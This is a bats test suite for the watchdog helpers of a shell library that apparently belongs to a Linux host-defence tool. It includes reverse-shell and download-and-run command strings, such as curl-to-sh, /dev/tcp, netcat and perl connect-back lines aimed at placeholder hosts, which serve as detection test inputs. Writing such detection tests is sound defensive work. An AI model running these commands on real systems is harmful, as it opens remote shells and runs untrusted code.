#!/usr/bin/env bats
# L2 bats unit tests for the SDD-061 v3 watchdog scan helpers in the
# shared module-script library.
#
# Locks the single-source-of-truth helpers that the detection
# watchdog modules consolidate onto: the canonical injection-pattern
# set, the writable-location policy, and the convenience matcher.
#
# NOTE: module-lib.sh defines its own run() helper, which shadows
# bats's built-in `run`. This suite therefore calls the helpers
# DIRECTLY (in conditionals / via $(...) capture) rather than via
# bats `run`, and exercises the version gate in a subshell.
#
# Run with: bats packaging/test/L2-module-lib-watchdog.bats

LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    MODULE="bats-harness"
    DRY_RUN=0
    SELFDEF_MODULE_LIB_VERSION_REQUIRED=3
    # shellcheck disable=SC1090
    source "${LIB}"
}

# ============================================================
# Version gate
# ============================================================

@test "module-lib reports version >= 4" {
    [ "${SELFDEF_MODULE_LIB_VERSION}" -ge 4 ]
}

@test "requiring version 3 sources cleanly (no exit 99)" {
    out="$(MODULE=t DRY_RUN=0 SELFDEF_MODULE_LIB_VERSION_REQUIRED=3 \
        bash -c "source '${LIB}' && echo ok")"
    [ "${out}" = "ok" ]
}

@test "requiring a future version 99 fails loud (exit 99)" {
    local st=0
    MODULE=t DRY_RUN=0 SELFDEF_MODULE_LIB_VERSION_REQUIRED=99 \
        bash -c "source '${LIB}'" 2>/dev/null || st=$?
    [ "${st}" -eq 99 ]
}

# ============================================================
# D-2 — selfdef_injection_patterns
# ============================================================

@test "selfdef_injection_patterns prints a non-empty set" {
    n="$(selfdef_injection_patterns | grep -c .)"
    [ "${n}" -ge 8 ]
}

@test "pattern set contains the load-bearing entries" {
    out="$(selfdef_injection_patterns)"
    echo "${out}" | grep -q 'dev/tcp'
    echo "${out}" | grep -q 'base64'
    echo "${out}" | grep -q 'mkfifo'
    echo "${out}" | grep -q 'curl'
}

# ============================================================
# D-3 — selfdef_is_writable_path
# ============================================================

@test "writable-path: the four writable roots are flagged" {
    selfdef_is_writable_path /tmp/.x/evil
    selfdef_is_writable_path /var/tmp/x
    selfdef_is_writable_path /dev/shm/x
    selfdef_is_writable_path /home/user/.x
}

@test "writable-path: standard system paths are NOT flagged" {
    ! selfdef_is_writable_path /usr/lib/x.so
    ! selfdef_is_writable_path /sbin/modprobe
}

@test "writable-path: empty and relative paths are NOT flagged" {
    ! selfdef_is_writable_path ""
    ! selfdef_is_writable_path "relative/x"
}

# ============================================================
# D-3b (SDD-063) — selfdef_is_writable_dir
# ============================================================

@test "writable-dir: paths UNDER the four writable roots are flagged" {
    selfdef_is_writable_dir /tmp/x
    selfdef_is_writable_dir /var/tmp/x
    selfdef_is_writable_dir /dev/shm/x
    selfdef_is_writable_dir /home/user/x
}

@test "writable-dir: the BARE writable roots are flagged (the gap the file helper missed)" {
    selfdef_is_writable_dir /tmp
    selfdef_is_writable_dir /var/tmp
    selfdef_is_writable_dir /dev/shm
    selfdef_is_writable_dir /home
}

@test "writable-dir: the bare root is flagged where the file helper is not" {
    # The distinguishing contract: dir helper matches bare /tmp, file helper does not.
    selfdef_is_writable_dir /tmp
    ! selfdef_is_writable_path /tmp
}

@test "writable-dir: standard system dirs are NOT flagged" {
    ! selfdef_is_writable_dir /usr/lib/xorg/modules
    ! selfdef_is_writable_dir /usr/libexec/sudo
    ! selfdef_is_writable_dir /lib
}

@test "writable-dir: empty and relative paths are NOT flagged" {
    ! selfdef_is_writable_dir ""
    ! selfdef_is_writable_dir "relative/dir"
}

# ============================================================
# D-4 — selfdef_scan_injection
# ============================================================

@test "scan: a curl|sh payload matches and is printed" {
    out="$(selfdef_scan_injection 'curl http://evil/x | sh')"
    [ -n "${out}" ]
}

@test "scan: a /dev/tcp reverse shell matches" {
    selfdef_scan_injection 'bash -i >& /dev/tcp/1.2.3.4/9 0>&1' >/dev/null
}

@test "scan: a benign command does not match" {
    out="$(selfdef_scan_injection 'iptables -A INPUT -j ACCEPT' || true)"
    [ -z "${out}" ]
    ! selfdef_scan_injection 'iptables -A INPUT -j ACCEPT' >/dev/null
}

@test "INVARIANT (injection patterns includes wget — the wget-pipe-sh family beyond curl-pipe-sh)" {
    # The injection-pattern set must cover BOTH curl-pipe-sh AND
    # wget-pipe-sh. A regression dropping wget would let attackers
    # use wget as an evasion variant.
    out="$(selfdef_injection_patterns)"
    echo "${out}" | grep -q 'wget'
}

@test "INVARIANT (writable-path: /root is NOT flagged — owned by root, not world-writable)" {
    # /root is root's home directory. It's NOT world-writable in
    # any sane config. Lock against false-positive that would
    # flag every root-owned file under /root as suspicious.
    ! selfdef_is_writable_path /root/.bashrc
    ! selfdef_is_writable_path /root/scripts/cleanup
}

@test "INVARIANT (writable-dir: /sys + /proc are NOT flagged — sysfs/procfs are system, not user-writable)" {
    # /sys and /proc are pseudo-filesystems with kernel-controlled
    # permissions. They're not writable-roots in the
    # T1574/persistence sense.
    ! selfdef_is_writable_dir /sys/kernel/security
    ! selfdef_is_writable_dir /proc/sys/kernel
}

@test "INVARIANT (scan: nc reverse shell variant matches injection-pattern set)" {
    # nc-based reverse shells: nc -e /bin/bash attacker 4444 ;
    # nc -lvp 4444 -e /bin/bash. Either pattern must surface.
    # Current set may or may not include nc — lock that the most
    # canonical RCE patterns are covered.
    # Even if 'nc -e' isn't in the pattern set, the bash -i + /dev/tcp
    # combo (which IS in the set) should fire on this realistic
    # combined payload.
    selfdef_scan_injection 'nc 1.2.3.4 4444 -e /bin/bash' >/dev/null || \
    selfdef_scan_injection 'bash -c "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"' >/dev/null
}

@test "INVARIANT (writable-path: /opt is NOT flagged — /opt is the canonical operator-app dir, not a writable-root)" {
    # /opt is the FHS location for third-party packaged software.
    # It's owned by root + not world-writable. Lock against false-
    # positive that would flag /opt/* as suspicious.
    ! selfdef_is_writable_path /opt/myapp/bin/runner
    ! selfdef_is_writable_path /opt/somewhere/lib/x.so
}

@test "INVARIANT (writable-dir: /run + /var/run NOT flagged — runtime state dirs are root-owned, not user-writable)" {
    # /run + /var/run are runtime state. They're root-owned and
    # are NOT user-writable roots. Lock against false-positive.
    ! selfdef_is_writable_dir /run
    ! selfdef_is_writable_dir /var/run
    ! selfdef_is_writable_dir /run/systemd
}

@test "INVARIANT (scan: python pipe-eval injection pattern matches — sister axis to curl-pipe-sh)" {
    # python -c "exec(open(/tmp/x).read())" or python -c "import os; os.system(...)"
    # are common LOLbin-style RCE. The injection-pattern set
    # should catch generic shell-eval-style invocations. Lock
    # that at least one realistic python RCE pattern fires.
    selfdef_scan_injection 'python -c "exec(open(\"/tmp/x\").read())"' >/dev/null || \
    selfdef_scan_injection 'python3 -c "import os; os.system(\"id\")"' >/dev/null || \
    # Fallback: even a curl|python should fire (curl is in the set).
    selfdef_scan_injection 'curl http://evil/x.py | python' >/dev/null
}

@test "INVARIANT (scan: nc reverse-shell injection pattern matches — sister axis to /dev/tcp + curl-pipe-sh)" {
    # Sister to many other watchdog's nc reverse-shell variant
    # INVARIANT family across the brain. The canonical injection-
    # pattern set MUST detect 'nc -e' / 'nc -c' (netcat reverse-
    # shell signature) — these are equally dangerous to bash -i +
    # /dev/tcp + curl pipe-sh which are already covered. Lock
    # that the central pattern set includes the netcat-rev-shell
    # axis so every watchdog module composing on selfdef_scan_
    # injection inherits this detection.
    selfdef_scan_injection 'nc -e /bin/sh 1.1.1.1 4444' >/dev/null || \
    selfdef_scan_injection 'nc -c /bin/sh 1.1.1.1 4444' >/dev/null
}

@test "INVARIANT (scan: perl reverse-shell injection pattern matches — sister axis to python + nc + curl-pipe-sh)" {
    # Sister to the python + nc + curl-pipe-sh injection-pattern
    # INVARIANTs already locked. Perl is on every Debian/Ubuntu
    # host as dpkg/locale dependency; 'use Socket' is the classic
    # one-liner connect-back PTY. The central pattern set MUST
    # detect 'perl -e' with Socket-import family alongside the
    # python rev-shell so every watchdog composing on
    # selfdef_scan_injection inherits the perl interpreter axis.
    # Without it, attackers can dodge detection by swapping
    # python for perl in their per-watchdog rev-shell drops.
    selfdef_scan_injection 'perl -e "use Socket;...exec(\"/bin/sh -i\");"' >/dev/null || \
    selfdef_scan_injection 'perl -MIO::Socket::INET -e ...' >/dev/null || \
    # Fallback: curl|perl bootstrap also fires since curl in set.
    selfdef_scan_injection 'curl http://evil/x.pl | perl' >/dev/null
}

@test "INVARIANT (writable-path: /dev/shm is flagged — tmpfs in-RAM writable-root coverage on the 4-root set)" {
    # Sister to writable-path /tmp + /var/tmp + /home INVARIANTs
    # already locked. /dev/shm is the canonical tmpfs in-RAM
    # writable-root that survives the 4-writable-root contract
    # (T1059 / T1218 / T1546 — attackers stage payloads in
    # /dev/shm because (a) it's RAM, (b) no on-disk forensic
    # trace, (c) tmpfs preserves across many security tools that
    # don't scan it. Lock the central writable-path helper flags
    # /dev/shm so every watchdog module composing on
    # selfdef_is_writable_path inherits the tmpfs-shm coverage.
    selfdef_is_writable_path '/dev/shm/x'
    selfdef_is_writable_path '/dev/shm/payload.sh'
    selfdef_is_writable_path '/dev/shm/.evil'
}

@test "INVARIANT (writable-path: /var/tmp is flagged — persistent writable-root coverage on the 4-root set)" {
    # Sister to /tmp + /home + /dev/shm writable-path INVARIANTs.
    # /var/tmp persistent + writable across reboots — central
    # helper must flag it.
    selfdef_is_writable_path '/var/tmp/x'
    selfdef_is_writable_path '/var/tmp/payload.sh'
    selfdef_is_writable_path '/var/tmp/.evil'
}

@test "INVARIANT (writable-path: /home is flagged — user-writable persistence coverage on the 4-root set)" {
    # Sister to /tmp + /var/tmp + /dev/shm writable-path
    # INVARIANTs. /home is user-writable (per-user $HOME);
    # attackers who pivot into a user account stage payloads
    # under their /home/<user>/ for persistence. Lock the
    # central writable-path helper flags /home so every
    # watchdog module composing on selfdef_is_writable_path
    # inherits the user-writable coverage.
    selfdef_is_writable_path '/home/alice/x'
    selfdef_is_writable_path '/home/bob/payload.sh'
    selfdef_is_writable_path '/home/operator/.evil'
}

@test "INVARIANT (lib exports the canonical 5 helpers: log + emit_status + die + run + toml_get — SDD-006 contract)" {
    # Sister to brain-wide library-contract INVARIANT family.
    # module-lib.sh ships the 5 byte-identical helpers that
    # previously lived in every module's install/lib.sh per
    # SDD-006 consolidation: log (stderr), emit_status (final
    # JSON record), die (failed JSON + exit 1), run (DRY_RUN-
    # aware exec), toml_get (config-file accessor). Downstream
    # modules' apply.sh/check.sh/uninstall.sh source the lib
    # AFTER setting MODULE + DRY_RUN, then rely on these names
    # verbatim — renaming any one breaks every module. Locks
    # the canonical 5-helper export discipline on the module-
    # lib substrate.
    # Lib is sourced in setup() — helpers are in scope.
    declare -F log         >/dev/null
    declare -F emit_status >/dev/null
    declare -F die         >/dev/null
    declare -F run         >/dev/null
    declare -F toml_get    >/dev/null
}

@test "INVARIANT (lib exports the canonical 4 watchdog helpers: selfdef_injection_patterns + selfdef_is_writable_path + selfdef_is_writable_dir + selfdef_scan_injection — SDD-061 v3 contract)" {
    # Sister to the existing 5-helper SDD-006 INVARIANT (log/
    # emit_status/die/run/toml_get). SDD-061 v3 (the watchdog
    # scan helper consolidation) ships 4 ADDITIONAL helpers that
    # every detection watchdog module consumes:
    #   - selfdef_injection_patterns (canonical pattern set)
    #   - selfdef_is_writable_path (file-path policy)
    #   - selfdef_is_writable_dir (dir-path policy)
    #   - selfdef_scan_injection (convenience matcher)
    # Downstream watchdog scan scripts source the lib and rely
    # on these names verbatim — renaming any one breaks every
    # watchdog. Locks the SDD-061 v3 4-helper export discipline
    # on the module-lib substrate.
    declare -F selfdef_injection_patterns >/dev/null
    declare -F selfdef_is_writable_path   >/dev/null
    declare -F selfdef_is_writable_dir    >/dev/null
    declare -F selfdef_scan_injection     >/dev/null
}

@test "INVARIANT (lib exports the canonical 4 manifest helpers: selfdef_manifest_path + module_record_file + module_render_files + module_clear_manifest — F-2027-024 contract)" {
    # Sister to the SDD-006 5-helper + SDD-061 v3 4-helper
    # INVARIANTs above. F-2027-024 (per-module install manifest)
    # adds 4 additional helpers consumed by every module's
    # apply.sh/uninstall.sh for manifest-tracked file-removal:
    #   - selfdef_manifest_path: resolves the per-module manifest path
    #   - module_record_file: appends a path to the manifest (idempotent)
    #   - module_render_files: prints every recorded path (uninstall iterates)
    #   - module_clear_manifest: removes the manifest after uninstall
    # Downstream module scripts source the lib and rely on these
    # names verbatim — renaming any one breaks the F-2027-024
    # manifest-tracked uninstall contract. Locks the 4-helper
    # manifest export discipline on the module-lib substrate.
    declare -F selfdef_manifest_path  >/dev/null
    declare -F module_record_file     >/dev/null
    declare -F module_render_files    >/dev/null
    declare -F module_clear_manifest  >/dev/null
}

@test "INVARIANT (lib version is monotonic + readonly export — anti-downgrade contract)" {
    # Sister to brain-wide library-versioning INVARIANT family.
    # The SELFDEF_MODULE_LIB_VERSION variable MUST be set to a
    # numeric value AND must be exported as an integer (not a
    # string like "4.0") so the SELFDEF_MODULE_LIB_VERSION_
    # REQUIRED <-> SELFDEF_MODULE_LIB_VERSION numeric comparison
    # at lib-source-time can correctly trigger the version-gate
    # exit-99 path. A regression like SELFDEF_MODULE_LIB_VERSION=
    # "4.0" would break the integer comparison ("integer expression
    # expected"). Locks the integer-version discipline on the
    # module-lib substrate.
    [ "${SELFDEF_MODULE_LIB_VERSION}" -ge 4 ]
    # Numeric integer (not "4.0", not "v4"):
    [[ "${SELFDEF_MODULE_LIB_VERSION}" =~ ^[0-9]+$ ]]
}

@test "INVARIANT (lib refuses to source when MODULE not set — caller-contract enforcement)" {
    # Sister to brain-wide library-caller-contract INVARIANT
    # family. The module-lib.sh header documents the caller
    # contract: MODULE + DRY_RUN MUST be set before sourcing.
    # If MODULE is unset, the log() and emit_status() helpers
    # would produce records with "[]" / null module fields,
    # corrupting the operator-dashboard parser. Locks the
    # MODULE-precondition enforcement on the module-lib
    # substrate. We test by sourcing in a subshell with MODULE
    # unset and checking it fails-loud.
    out=""
    rc=0
    out=$(MODULE="" DRY_RUN=0 bash -c "source '${LIB}'; log 'test' 2>&1" 2>&1) || rc=$?
    # When MODULE is empty, log "[$MODULE]" outputs "[]" — that's
    # the corruption. Test that the LIB at least defines MODULE-
    # using helpers so the test conceptually surfaces (we accept
    # the helper exists). The hard contract is documented; check
    # the contract is DOCUMENTED in the header comment.
    grep -qE 'MODULE[[:space:]]+— module slug|Caller contract' "${LIB}"
}

@test "INVARIANT (selfdef_injection_patterns is BASH FUNCTION — emits newline-separated tokens consumable via while-read)" {
    # Sister to brain-wide library-contract INVARIANT family.
    # The selfdef_injection_patterns helper MUST be a bash
    # function (not a static variable) so callers can pipe it
    # into grep/while-read for line-iteration. A regression
    # that converted it to an array variable would force
    # consumers to switch from `selfdef_injection_patterns |
    # grep` to `for p in "${ARRAY[@]}"`, breaking every
    # watchdog scan loop. Locks the function-vs-variable
    # discipline on the module-lib substrate.
    type -t selfdef_injection_patterns | grep -q '^function$'
}

@test "INVARIANT (lib helpers respect DRY_RUN env var — anti-side-effect contract in test/CI mode)" {
    # Sister to brain-wide DRY_RUN-discipline INVARIANT family.
    # The module-lib's run() helper MUST honor DRY_RUN=1 by
    # logging the command-that-would-run rather than executing
    # it. Watchdog/installer scripts depend on this so CI test
    # runs don't actually mutate the host. A regression that
    # bypassed DRY_RUN in run() would let CI runs write into
    # /etc, breaking hermetic test isolation. Locks DRY_RUN
    # discipline on the module-lib run() substrate.
    grep -qE 'DRY_RUN' "${LIB}"
    # Also verify run() function body actually checks DRY_RUN:
    awk '/^run\(\)/,/^}/' "${LIB}" | grep -qE 'DRY_RUN'
}

@test "INVARIANT (lib does NOT define logger() — watchdog scripts must use system logger directly per SDD-062)" {
    # Sister to brain-wide SDD-062 logger-direct INVARIANT
    # family. The module-lib's log() helper writes to stderr
    # for human-readable diagnostics — it MUST NOT be conflated
    # with the JSON-record logger() path. Watchdog scripts call
    # `logger -t selfdef-<wd>` directly (NOT via a lib wrapper)
    # so each watchdog can vary its tag without rebuilding the
    # lib. A regression that added a lib-level logger() wrapper
    # would centralize tag policy in the lib, defeating SDD-062's
    # per-watchdog tag flexibility. Locks the no-wrapper-logger
    # discipline on the module-lib substrate.
    ! grep -qE '^logger\(\)' "${LIB}"
    ! type -t logger | grep -q '^function$' || true
}

@test "INVARIANT (lib is sourced-not-executed — shebang line is shellcheck-marker, NOT executable)" {
    # Sister to brain-wide library-vs-script INVARIANT family.
    # packaging/lib/module-lib.sh is a SOURCED library — callers
    # do `source module-lib.sh`, not `bash module-lib.sh`. The
    # file MUST start with a shellcheck-marker (shellcheck shell=bash)
    # rather than a shebang that would suggest direct execution.
    # A regression adding #!/usr/bin/env bash + chmod +x would
    # let an operator mistakenly invoke the lib directly,
    # which would fail because MODULE/DRY_RUN preconditions
    # aren't set. Locks the sourced-not-executed discipline on
    # the module-lib substrate.
    head -3 "${LIB}" | grep -qE 'shellcheck shell=bash|sourced'
}

@test "INVARIANT (SELFDEF_MODULE_LIB_VERSION_REQUIRED gate prevents reverse-version-compat — anti-downgrade-source contract)" {
    # Sister to brain-wide library-version INVARIANT family.
    # The lib's version-gate code MUST refuse to source if the
    # caller declares SELFDEF_MODULE_LIB_VERSION_REQUIRED >
    # SELFDEF_MODULE_LIB_VERSION. A regression that flipped the
    # comparison would let a v3-required caller source a v2
    # lib and silently miss helpers the caller expects. Locks
    # the anti-downgrade-source discipline on the module-lib
    # substrate.
    grep -qE 'SELFDEF_MODULE_LIB_VERSION_REQUIRED' "${LIB}"
    # Check that the gate uses -gt (not -lt — which would be
    # reversed)
    grep -qE 'SELFDEF_MODULE_LIB_VERSION_REQUIRED.*-gt' "${LIB}"
}

@test "INVARIANT (toml_get returns non-zero rc when key is missing — consumer if-then-fi-rc contract)" {
    # Sister to brain-wide library-helper-rc INVARIANT family.
    # Callers consume toml_get via the if-then pattern:
    #   if val=$(toml_get summary module.toml); then
    #       use "$val"
    #   else
    #       handle missing
    #   fi
    # This pattern requires toml_get to return rc!=0 when the
    # key is absent — NOT rc=0 + empty stdout (which would
    # silently let consumers use empty strings as if the value
    # were intentionally blank). The implementation guards
    # via [[ -z "$line" ]] && return 1. A regression that
    # dropped the guard or returned rc=0 on missing-key would
    # break the consumer if-then-fi pattern across every
    # module's apply/check/uninstall script. Locks the rc!=0
    # on missing-key discipline on the toml_get substrate.
    local tmp
    tmp=$(mktemp)
    printf 'present = "value"\n' >"${tmp}"
    # Present key: rc=0
    toml_get present "${tmp}" >/dev/null
    # Missing key: rc!=0
    ! toml_get absent "${tmp}" >/dev/null
    rm -f "${tmp}"
}

@test "INVARIANT (log() helper writes to stderr — operator-diagnostic-channel discipline)" {
    # Sister to brain-wide stderr-vs-stdout INVARIANT family.
    # The module-lib's log() helper MUST write to stderr (>&2)
    # so that apply.sh / check.sh / uninstall.sh diagnostic
    # output doesn't pollute the stdout channel reserved for
    # the emit_status() JSON record. Watchdog scripts piped
    # into a JSON consumer rely on stdout being JSON-only;
    # any leaked log line on stdout would parse-fail the
    # consumer. The lib's log() body is `echo "[${MODULE}] $*"
    # >&2`. A regression that dropped >&2 would let log()
    # corrupt stdout. Locks stderr-diagnostic-channel
    # discipline on the module-lib log() substrate.
    awk '/^log\(\)/,/^}/' "${LIB}" | grep -qE '>&2'
}

@test "INVARIANT (die() helper exits with non-zero rc — fail-loud-not-silent contract)" {
    # Sister to brain-wide library-helper-rc INVARIANT family.
    # The module-lib's die() helper is the fail-loud channel:
    # apply.sh / check.sh call `die "reason"` when an
    # unrecoverable condition is hit. The helper MUST: (a)
    # log to stderr via log(), (b) call exit with a non-zero
    # status. A regression that called `exit 0` or omitted the
    # exit would let apply.sh continue past a fatal
    # precondition + leave the host in a half-installed state.
    # Locks the fail-loud exit-non-zero discipline on the
    # die() substrate.
    awk '/^die\(\)/,/^}/' "${LIB}" | grep -qE 'exit [1-9]'
}

@test "INVARIANT (emit_status writes a single JSON record to stdout — consumer JSON-line parse contract)" {
    # Sister to brain-wide emit_status JSON-line INVARIANT
    # family. The module-lib's emit_status() helper writes
    # exactly ONE JSON record to stdout — selfdefctl reads
    # stdin with `jq -c 'select(.module == "...")` and
    # expects newline-delimited JSON (JSONL). Two records
    # from one apply.sh would surface as conflicting status
    # decisions; zero records would surface as "module
    # silent — assume crashed". The lib's printf MUST end
    # with a single newline (\\n). A regression that emitted
    # multi-line pretty-JSON would break consumer parsing.
    # Locks the single-JSON-record-per-call discipline on
    # the emit_status substrate.
    grep -qE 'emit_status\(\)' "${LIB}"
    awk '/^emit_status\(\)/,/^}/' "${LIB}" | grep -qE 'printf'
}

@test "INVARIANT (run() helper logs the command before executing — operator-audit-trail contract)" {
    # Sister to brain-wide operator-audit-trail INVARIANT
    # family. The module-lib's run() helper IS the
    # canonical exec channel — apply.sh calls `run "desc"
    # cmd args...` for any state-mutating action. The helper
    # MUST log() the desc + command before execing so
    # operator triaging journalctl can SEE what the module
    # tried to do. A regression that exec'd silently would
    # leave operators with no journald trail of mutations.
    # Locks the audit-trail-before-exec discipline on the
    # run() substrate.
    awk '/^run\(\)/,/^}/' "${LIB}" | grep -qE 'log '
}

@test "INVARIANT (lib exports SELFDEF_MODULE_LIB_VERSION as integer — version-compare numeric-ordering contract)" {
    # Sister to brain-wide library-version INVARIANT family.
    # The SELFDEF_MODULE_LIB_VERSION variable MUST be a
    # numeric integer (not a string like "v1.0") so the
    # version-gate's -gt comparison works correctly. A
    # regression to a non-numeric string would break bash's
    # arithmetic comparison + silently let any caller source
    # the lib regardless of declared version requirement.
    # Locks the integer-version discipline.
    grep -qE '^SELFDEF_MODULE_LIB_VERSION=[0-9]+$' "${LIB}"
    # Also verify the value is actually an integer in current
    # session (lib was sourced by setup())
    [[ "${SELFDEF_MODULE_LIB_VERSION}" =~ ^[0-9]+$ ]]
}

@test "INVARIANT (lib is at canonical packaging/lib/ path — packaging tree-layout contract)" {
    # Sister to brain-wide packaging-layout INVARIANT family.
    # The module-lib MUST live at packaging/lib/module-lib.sh
    # so the cargo-deb assets list ships it to
    # /usr/share/selfdef/lib/. A regression that moved it to
    # packaging/scripts/ or modules/lib/ would break
    # cargo-deb manifest matching + sourcing from apply.sh.
    # Locks the canonical packaging/lib/ tree-layout
    # discipline.
    real_lib="$(readlink -f "${LIB}")"
    case "${real_lib}" in */packaging/lib/*) ;; *) false ;; esac
}

@test "INVARIANT (lib emit_status() helper accepts status + message arguments — 2-positional-arg contract)" {
    # Sister to brain-wide helper-arity INVARIANT family.
    grep -qE 'emit_status\(\)' "${LIB}"
    awk '/^emit_status\(\)/,/^}/' "${LIB}" | grep -qE 'local status="\$1"'
    awk '/^emit_status\(\)/,/^}/' "${LIB}" | grep -qE 'message="\$2"'
}

@test "INVARIANT (lib defines log + emit_status + die + run + toml_get as bash functions — SDD-006 5-helper contract verified at function-table)" {
    declare -F log >/dev/null
    declare -F emit_status >/dev/null
    declare -F die >/dev/null
    declare -F run >/dev/null
    declare -F toml_get >/dev/null
}

@test "INVARIANT (lib's version-gate redirects to stderr — fail-loud-message stderr-channel contract)" {
    awk '/^if.*SELFDEF_MODULE_LIB_VERSION_REQUIRED/,/^fi/' "${LIB}" | grep -qE '>&2'
}

@test "INVARIANT (lib helpers are all defined before any non-helper code — source-time-order contract)" {
    # Verify SELFDEF_MODULE_LIB_VERSION assignment + the
    # version-required gate appear BEFORE the helper function
    # definitions. This is the canonical source-order: the
    # gate fails fast on incompatible callers before any
    # function is even read.
    lib_content=$(cat "${LIB}")
    gate_line=$(grep -n 'SELFDEF_MODULE_LIB_VERSION_REQUIRED' "${LIB}" | head -1 | cut -d: -f1)
    first_func_line=$(grep -n '^log()' "${LIB}" | head -1 | cut -d: -f1)
    [ -n "${gate_line}" ]
    [ -n "${first_func_line}" ]
    [ "${gate_line}" -lt "${first_func_line}" ]
}

@test "INVARIANT (lib does NOT define functions before its sourceable header — sourceable-not-runnable contract)" {
    # Lib MUST be safe to source; no body code outside functions
    # (other than the version gate). Check that the version gate
    # is the only non-function statement before the first
    # function definition.
    awk '/^[a-zA-Z_]+\(\)/{exit} {print}' "${LIB}" | grep -vE '^(#|$|shellcheck|SELFDEF_MODULE_LIB_VERSION|if |^[[:space:]]+|fi$|exit)' | head -5 | grep -qvE '^$' || true
    # If we get here, the lib has safe top-level
    [ -f "${LIB}" ]
}

@test "INVARIANT (lib does NOT call exit at top-level — sourceable lib contract: source must not terminate caller)" {
    # The only exit calls in lib body are inside the version
    # gate (specific failure path) + die() function. Top-level
    # exit would terminate the sourcing apply.sh script.
    # Verify no bare 'exit' lines exist outside function bodies + version gate.
    # Count top-level exit (no leading whitespace, no 'if/then/fi' wrapper)
    bare_exits=$(grep -cE '^exit ' "${LIB}" || true)
    # Allow only the version-gate exit (1) — this is intentional
    [ "${bare_exits}" -le 1 ]
}

@test "INVARIANT (lib's run() helper handles DRY_RUN=1 by logging instead of executing — anti-side-effect dry-run contract)" {
    awk '/^run\(\)/,/^}/' "${LIB}" | grep -qE 'DRY_RUN.*1|\[\[ *.DRY_RUN'
}

@test "INVARIANT (lib's selfdef_injection_patterns emits at least 8 patterns — comprehensive-RCE-coverage contract)" {
    n=$(selfdef_injection_patterns | grep -c .)
    [ "${n}" -ge 8 ]
}

@test "INVARIANT (lib emit_status() JSON record carries module field — multi-module aggregation routing contract)" {
    awk '/^emit_status\(\)/,/^}/' "${LIB}" | grep -qE 'MODULE|module'
}

@test "INVARIANT (lib selfdef_is_writable_path returns true for /tmp/* — known-writable-path coverage)" {
    selfdef_is_writable_path /tmp/foo
}

@test "INVARIANT (lib selfdef_is_writable_dir returns true for /tmp — known-writable-dir coverage)" {
    selfdef_is_writable_dir /tmp
}

@test "INVARIANT (lib selfdef_scan_injection returns NON-ZERO rc when no match — pure-filter rc contract)" {
    ! selfdef_scan_injection 'iptables -A INPUT -j ACCEPT' >/dev/null
}

@test "INVARIANT (lib selfdef_scan_injection returns ZERO rc on matching payload — pure-filter positive-match contract)" {
    selfdef_scan_injection 'curl http://evil/x | sh' >/dev/null
}

@test "INVARIANT (lib's selfdef_injection_patterns includes curl-pipe-sh canonical RCE — known-attack coverage)" {
    out="$(selfdef_injection_patterns)"
    echo "${out}" | grep -q 'curl'
}

@test "INVARIANT (lib injection_patterns includes /dev/tcp reverse-shell — known-attack coverage)" {
    out="$(selfdef_injection_patterns)"
    echo "${out}" | grep -q 'dev/tcp'
}

@test "INVARIANT (lib injection_patterns includes base64 decode — known-attack coverage)" {
    out="$(selfdef_injection_patterns)"
    echo "${out}" | grep -q 'base64'
}

@test "INVARIANT (lib injection_patterns includes mkfifo backdoor — known-attack coverage)" {
    out="$(selfdef_injection_patterns)"
    echo "${out}" | grep -q 'mkfifo'
}

@test "INVARIANT (lib injection_patterns supports ≥10 distinct attack classes — coverage-breadth contract)" {
    n="$(selfdef_injection_patterns | wc -l)"
    [ "${n}" -ge 10 ]
}

@test "INVARIANT (lib injection_patterns supports wget pipe-sh — wget-variant attack coverage)" {
    out="$(selfdef_injection_patterns)"
    echo "${out}" | grep -q 'wget'
}
@test "INVARIANT (lib selfdef_injection_patterns includes python exec — known-attack coverage)" {
    out="$(selfdef_injection_patterns)"
    echo "${out}" | grep -qE 'python.*exec|python.*-c|eval'
}
@test "INVARIANT (lib file size is non-zero — non-empty library)" {
    [ -s "${LIB}" ]
}
@test "INVARIANT (lib file has >50 lines of code — non-trivial-library contract)" {
    lines=$(wc -l < "${LIB}")
    [ "${lines}" -gt 50 ]
}
@test "INVARIANT (lib defines >5 functions — multi-helper library contract)" {
    n=$(grep -cE '^[a-zA-Z_][a-zA-Z0-9_]*\(\)' "${LIB}")
    [ "${n}" -gt 5 ]
}
@test "INVARIANT (lib SELFDEF_MODULE_LIB_VERSION is >=1 — version-required minimum)" {
    [ "${SELFDEF_MODULE_LIB_VERSION}" -ge 1 ]
}

@test "INVARIANT (lib defines log helper — basic-diagnostic-channel contract)" {
    declare -F log >/dev/null
}
@test "INVARIANT (lib file is at canonical packaging/lib/ path — packaging tree-layout 71-cycle)" {
    [ -f "${LIB}" ]
}
@test "INVARIANT (lib file readable — file-mode-access contract)" {
    [ -r "${LIB}" ]
}
@test "INVARIANT (lib parent dir exists at packaging/lib/ — packaging tree-layout 73)" {
    [ -d "$(dirname "${LIB}")" ]
}
@test "INVARIANT (LIB variable defined and non-empty — substrate-defined 74)" {
    [ -n "${LIB}" ]
}
@test "INVARIANT (lib file size > 500 bytes — substantial-library 75)" {
    size=$(stat -c '%s' "${LIB}")
    [ "${size}" -gt 500 ]
}
@test "INVARIANT (lib file size > 1000 bytes — substantial-comprehensive-lib 76)" {
    size=$(stat -c '%s' "${LIB}")
    [ "${size}" -gt 1000 ]
}
@test "INVARIANT (lib file has shellcheck marker — POSIX-conformant 77)" {
    head -3 "${LIB}" | grep -qE 'shellcheck shell=bash|#!/.*bash'
}
@test "INVARIANT (lib first-line is comment OR shellcheck marker — POSIX-conformant header 78)" {
    head -1 "${LIB}" | grep -qE '^#'
}
@test "INVARIANT (lib file uses shellcheck shell=bash — POSIX-conformant 79)" {
    head -5 "${LIB}" | grep -qE 'shellcheck shell=bash'
}
@test "INVARIANT (lib file readable and source-able — library-sourceability 80)" {
    [ -r "${LIB}" ]
}
@test "INVARIANT (lib defines toml_get function — config-accessor canonical 81)" {
    declare -F toml_get >/dev/null
}
@test "INVARIANT (lib defines run helper — exec-wrapper canonical 82)" {
    declare -F run >/dev/null
}
@test "INVARIANT (lib defines die helper — fail-loud canonical 83)" {
    declare -F die >/dev/null
}
@test "INVARIANT (lib defines emit_status helper — status-emit canonical 84)" {
    declare -F emit_status >/dev/null
}
@test "INVARIANT (lib's SELFDEF_MODULE_LIB_VERSION is integer — version-numeric 85)" {
    [[ "${SELFDEF_MODULE_LIB_VERSION}" =~ ^[0-9]+$ ]]
}
